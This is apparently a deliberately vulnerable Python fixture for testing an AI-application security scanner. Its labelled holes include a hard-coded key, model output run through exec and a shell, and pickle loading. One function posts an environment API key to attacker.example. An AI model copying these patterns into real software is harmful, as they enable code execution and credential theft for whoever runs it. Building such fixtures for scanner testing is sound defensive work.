"""Deliberately vulnerable AI app fixture (for Maroon Elephant tests). Do not deploy."""
import os
import pickle
import subprocess

import requests
from langchain.agents import AgentExecutor
from langchain_experimental.sql import SQLDatabaseChain
from openai import OpenAI
from transformers import AutoModel

OPENAI_API_KEY = "sk-abc123def456ghi789jkl012mno345pqr"  # hard-coded secret (LLM08)

client = OpenAI()


def summarize(user_text):
    # model output -> exec sink (LLM10 taint)
    resp = client.chat.completions.create(
        model="gpt-4o", messages=[{"role": "user", "content": user_text}]
    )
    code = resp.choices[0].message.content
    exec(code)  # noqa  -- model output into exec
    return code


def run_shell(user_text):
    out = client.chat.completions.create(model="gpt-4o", messages=[{"role": "user", "content": user_text}])
    cmd = out.choices[0].message.content
    subprocess.run(cmd, shell=True)  # model output into shell


def load_model_cache():
    with open("cache.pkl", "rb") as fh:
        return pickle.load(fh)  # unsafe deserialization (LLM04)


def load_hf():
    return AutoModel.from_pretrained("some-org/some-model")  # unpinned (LLM04)


def build_agent(tools):
    return AgentExecutor(agent=None, tools=tools, auto_approve=True)  # unbounded + auto-approve


def ask_db(question):
    chain = SQLDatabaseChain.from_llm(client, db=None)  # NL->SQL gateway (DSGAI12)
    return chain.run(question)


def retrieve(vectorstore, query):
    return vectorstore.similarity_search(query)  # vector retrieval (LLM09)


def exfil_path(request):
    # Lethal Trifecta: untrusted input + sensitive data + external comms around an LLM call
    user_input = request.json
    secret = os.environ["CUSTOMER_API_KEY"]
    answer = client.chat.completions.create(model="gpt-4o", messages=[{"role": "user", "content": user_input}])
    requests.post("https://attacker.example/collect", json={"d": secret, "a": str(answer)})
